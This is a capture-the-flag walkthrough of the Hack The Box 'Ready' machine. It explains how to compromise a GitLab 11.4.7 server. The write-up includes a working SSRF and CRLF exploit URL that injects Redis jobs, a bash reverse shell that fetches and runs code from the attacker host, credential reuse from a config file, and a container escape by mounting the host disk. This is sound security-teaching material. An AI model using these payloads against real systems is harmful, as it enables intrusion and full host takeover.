# HTB Ready — Full Walkthrough

**Difficulty**: Medium  
**OS**: Linux (Ubuntu 20.04 host + Docker container)  
**Attacker IP**: 10.10.16.84  
**Target IP**: 10.129.227.132  
**Flags**: User + Root  

---

## The Hacker Mindset

Before a single command is run, understand the goal: **find a way in, escalate privilege, own the machine**. Every step is a question — *what is running here? is it old? is it misconfigured? what can I abuse?* You are always asking "what does this give me?" and "what does this open up next?"

---

## Phase 1 — Reconnaissance

### What is recon and why do we do it?

Reconnaissance means "find out what's there before you attack it." You can't exploit what you don't know exists. The very first thing any attacker does is map the target's attack surface — which ports are open, what services are running, what versions those services are. Version numbers are gold because old software has known public vulnerabilities.

### The Command

```bash
nmap -p- --min-rate 10000 -sCV -oA ready_scan 10.129.227.132
```

**Breaking this down:**
- `-p-` — scan **all 65535 ports**, not just the top 1000. Hidden services often live on high ports.
- `--min-rate 10000` — send at least 10,000 packets per second. Faster scan, acceptable in a CTF environment.
- `-sCV` — `-sC` runs default scripts (banner grabbing, HTTP titles, etc.), `-sV` detects service versions.
- `-oA ready_scan` — save output in all formats (nmap, grepable, XML) for later reference.
- `10.129.227.132` — the target.

### Results

```
22/tcp   open  ssh   OpenSSH 8.2p1 Ubuntu 4
5080/tcp open  http  nginx — GitLab Sign in
```

### Hacker Mindset

Two ports. SSH is almost never the entry point — you need credentials first. HTTP on a non-standard port (5080 instead of 80) is immediately interesting. The nmap script already told us it's GitLab. The question becomes: **what version, and is it vulnerable?**

---

## Phase 2 — Service Enumeration

### Visiting the Web Application

Open `http://10.129.227.132:5080` in a browser. You're greeted with a GitLab login page.

**Why register an account?**  
GitLab is a self-hosted git platform. Many instances allow open registration. Once logged in, the Help page reveals the exact GitLab version — critical information because GitLab has had serious CVEs in various versions.

After registering and logging in, navigate to **Help** (top-right avatar menu → Help). The page shows:

```
GitLab Community Edition 11.4.7
```

And crucially, a red warning: **"Update ASAP"**

### Hacker Mindset

Version 11.4.7. That's from 2018. Immediately search your memory or Google: *"GitLab 11.4.7 CVE"*. You'll find two related vulnerabilities that chain together for Remote Code Execution (RCE). This is the fundamental skill of a hacker — knowing that old software = known bugs = public exploits.

---

## Phase 3 — Understanding the Exploit Chain

### CVE-2018-19571 — Server-Side Request Forgery (SSRF)

**What is SSRF?**  
SSRF (Server-Side Request Forgery) is when you trick a server into making HTTP/network requests on your behalf. The server becomes your proxy. This is powerful because the server can reach internal services that you, as an outside attacker, cannot.

**How does it work in GitLab 11.4.7?**  
GitLab has a feature: "Import project from URL." You give it a git URL and GitLab's backend server fetches it. GitLab tried to block this being abused by blacklisting `127.0.0.1` and `localhost`. But it forgot to block IPv6 representations of localhost. 

`http://[0:0:0:0:0:ffff:127.0.0.1]` is a valid IPv6-mapped IPv4 address for `127.0.0.1`. The blacklist check fails, and GitLab happily connects to its own internal services.

**Why do we target Redis on port 6379?**  
GitLab uses Redis internally as a job queue. Redis by default has no authentication and listens on localhost — it was never meant to be exposed. If we can talk to Redis, we can push fake jobs into GitLab's job queue. GitLab workers will pick up those jobs and execute them.

### CVE-2018-19585 — CRLF Injection

**What is CRLF Injection?**  
HTTP and many protocols use `\r\n` (Carriage Return + Line Feed) to separate lines/commands. If an attacker can inject `\r\n` into a URL or header, they can add extra lines — effectively injecting new commands into the protocol stream.

**How does it work here?**  
When GitLab connects to the URL using the `git://` protocol, the URL path becomes the command sent to the remote service. By URL-encoding `\r\n` as `%0D%0A`, we can inject newlines into what GitLab sends to Redis. Instead of Redis receiving one garbled git request, it receives multiple valid Redis commands.

### The Chain Together

```
Attacker → GitLab import URL → GitLab backend fetches git://[IPv6-localhost]:6379/
                                         ↓
                             CRLF-injected Redis commands in URL
                                         ↓
                             Redis receives: MULTI, SADD, LPUSH (job payload), EXEC
                                         ↓
                             GitLab worker picks up job → executes shell command
                                         ↓
                             Reverse shell connects back to attacker
```

---

## Phase 4 — Crafting and Delivering the Exploit

### Prepare the Reverse Shell Script

```bash
echo '#!/bin/bash' > /tmp/shell.sh
echo 'bash -i >& /dev/tcp/10.10.16.84/443 0>&1' >> /tmp/shell.sh
```

**Why a separate shell script?**  
The Redis command payload has limited space and special characters need heavy URL-encoding. A clean approach is to have GitLab's server `curl` a shell script from our machine and pipe it to bash. Simpler payload, easier to debug, and avoids encoding nightmares.

**What does the shell.sh do?**  
`bash -i >& /dev/tcp/10.10.16.84/443 0>&1` — bash opens a TCP connection to our IP on port 443 and redirects stdin/stdout/stderr through it. This is a standard bash reverse shell. Port 443 (HTTPS) is chosen because firewalls rarely block outbound 443.

### Start the HTTP Server

```bash
cd /tmp && python3 -m http.server 80
```

This serves `shell.sh` over HTTP. When our payload tells the GitLab server to `curl http://10.10.16.84/shell.sh`, it fetches it from here.

### Start the Netcat Listener

```bash
nc -lnvp 443
```

- `-l` — listen mode
- `-n` — no DNS resolution (faster)
- `-v` — verbose (show connection info)
- `-p 443` — listen on port 443

This is waiting to catch the reverse shell when it connects back.

### The Exploit URL

In GitLab: **New Project → Import Project → Repo by URL**, paste:

```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system_hook_push%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem_hook_push%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class_eval%5C%22%2C%5C%22open%28%5C%27%7Ccurl%20http%3A%2F%2F10.10.16.84%2Fshell.sh%7Cbash%5C%27%29.read%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system_hook_push%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created_at%5C%22%3A1513714403.8122594%2C%5C%22enqueued_at%5C%22%3A1513714403.8129568%7D%22%0D%0A%20exec%0D%0A/ssrf.git
```

**Decoding what this URL does:**

| URL-encoded part | Decoded | Meaning |
|---|---|---|
| `%0D%0A` | `\r\n` | New line in Redis protocol |
| `%20` | ` ` (space) | Leading space (Redis requires it) |
| `multi` | `MULTI` | Start Redis transaction |
| `sadd resque:gitlab:queues system_hook_push` | add to queue list | Register our fake queue |
| `lpush resque:gitlab:queue:system_hook_push {...}` | push job | Enqueue fake GitlabShellWorker job |
| `exec` | `EXEC` | Commit the Redis transaction |

The job payload tells GitLab's Ruby worker to run `class_eval` → `open('|curl http://10.10.16.84/shell.sh|bash').read` — which executes our shell script.

### Result

```
connect to [10.10.16.84] from (UNKNOWN) [10.129.227.132] 39540
git@gitlab:~/gitlab-rails/working$
```

We have a shell as the `git` user inside a Docker container.

---

## Phase 5 — Shell Upgrade

### Why Upgrade the Shell?

The raw netcat shell is a "dumb" terminal — no tab completion, Ctrl+C kills your shell instead of the running process, and many programs won't work properly. Upgrading to a proper PTY (pseudo-terminal) fixes all this.

```bash
python3 -c 'import pty;pty.spawn("bash")'
```

Then press `Ctrl+Z` (background the netcat process), run:

```bash
stty raw -echo; fg
```

Then hit Enter twice and:

```bash
export TERM=xterm
```

Now you have a fully interactive shell.

---

## Phase 6 — User Flag

```bash
cat /home/dude/user.txt
```

```
db9cd69[redacted]ff977fc1
```

The user flag is in `/home/dude/` — a hint that a user named "dude" exists on the system (or in this container). Always check `/home/` immediately after gaining a shell.

---

## Phase 7 — Container Enumeration and Privilege Escalation

### Are We in a Container?

Several signs tell you you're in a Docker container:
- `/.dockerenv` file exists
- Very minimal tooling (no `ip`, no `ifconfig`)
- Hostname looks like a random hash
- Network interfaces show Docker bridge addresses

### Finding the Password

```bash
cat /opt/backup/gitlab.rb | grep -v "^#" | grep .
```

**Why this command?**  
`gitlab.rb` is GitLab's main configuration file. It's 1000+ lines but almost all of them are comments (start with `#`). The flags:
- `grep -v "^#"` — remove comment lines
- `grep .` — remove blank lines

This instantly surfaces the only active configuration line:

```
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
```

### Hacker Mindset

Configuration files left in backup directories are a goldmine. Developers often store credentials in config files. The `/opt/backup/` directory shouldn't exist in a production container — this is a misconfiguration. Always `ls /opt`, `ls /var`, check for backup/config/secret files.

### Escalating to Root in Container

```bash
su -
Password: wW59U!ZKMbG9+*#h
```

```
root@gitlab:~# id
uid=0(root) gid=0(root) groups=0(root)
```

The SMTP password was reused as the root password. **Password reuse is one of the most common real-world vulnerabilities.** Always try credentials you find across every service and account on the machine.

---

## Phase 8 — Container Escape

### We're Root — But in a Container

Root inside a container is not root on the host. The container is isolated. The flags we want are on the real host OS. We need to escape.

### Reading docker-compose.yml

```bash
cat /opt/backup/docker-compose.yml
```

The critical line:

```yaml
privileged: true
```

**What does `privileged: true` mean?**  
A privileged Docker container has almost all Linux capabilities granted. Most importantly, it can access host devices — including block devices (hard drives). This is a massive security misconfiguration. It essentially means the container has hardware-level access to the host.

### Enumerating the Host Disk

```bash
lsblk
```

```
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0   10G  0 disk 
|-sda2   8:2    0  9.5G  0 part /var/log/gitlab
|-sda3   8:3    0  512M  0 part [SWAP]
`-sda1   8:1    0    1M  0 part 
```

`lsblk` lists block devices. `sda2` is the main Linux partition (it's already mounted inside the container at `/var/log/gitlab` for log persistence). `sda2` contains the host's root filesystem.

### Mounting the Host Filesystem

```bash
mkdir /mnt/host
mount /dev/sda2 /mnt/host
```

Because we're root in a privileged container, we can mount the host's block device directly. This gives us read/write access to the entire host filesystem — as if we were physically sitting at the machine with a live USB.

```bash
cat /mnt/host/root/root.txt
```

```
368efd[redacted]74f87e9f
```

Root flag obtained.

### Hacker Mindset

`privileged: true` in Docker is essentially saying "this container is the same as the host." It's a well-known Docker escape vector. In real penetration testing, finding this in a docker-compose or Kubernetes pod spec is an instant critical finding. The container boundary provides zero security at this point.

---

## Full Attack Summary

```
[Recon]
nmap → ports 22 (SSH), 5080 (GitLab 11.4.7)

[Foothold]
Register GitLab account
↓
Import project with SSRF+CRLF payload
CVE-2018-19571: IPv6 bypass of localhost block → reach Redis
CVE-2018-19585: CRLF injection → inject Redis commands into URL
↓
Redis job queue → GitlabShellWorker executes curl|bash
↓
Reverse shell as git (uid=998) inside Docker container

[User Flag]
/home/dude/user.txt → db9cd6[redacted]2ff977fc1

[Container PrivEsc]
/opt/backup/gitlab.rb → smtp_password = "wW59U!ZKMbG9+*#h"
su - → root@gitlab (uid=0) — password reuse

[Container Escape]
/opt/backup/docker-compose.yml → privileged: true
lsblk → /dev/sda2 is host root partition
mount /dev/sda2 /mnt/host → host filesystem accessible

[Root Flag]
/mnt/host/root/root.txt → 368efd[redacted]74f87e9f
```

---

## Key Lessons

| Lesson | Takeaway |
|---|---|
| Version numbers matter | GitLab 11.4.7 from 2018 had two public CVEs. Always check versions. |
| SSRF bypasses trust boundaries | A server making requests on your behalf can reach internal services you can't. |
| IPv6 bypasses IPv4 blocklists | If a blocklist only checks `127.0.0.1`, try `[::1]` or IPv6-mapped addresses. |
| CRLF = protocol injection | Newlines in user input that reach protocol commands = injected commands. |
| Config files leak secrets | `/opt/backup/gitlab.rb` had a plaintext password. Always grep configs. |
| Password reuse is everywhere | SMTP password = root password. Try every credential everywhere. |
| Privileged containers = host access | `privileged: true` in Docker nullifies all container isolation. |
| Backup directories are dangerous | `/opt/backup/` contained the full config, secrets, and deployment info. |
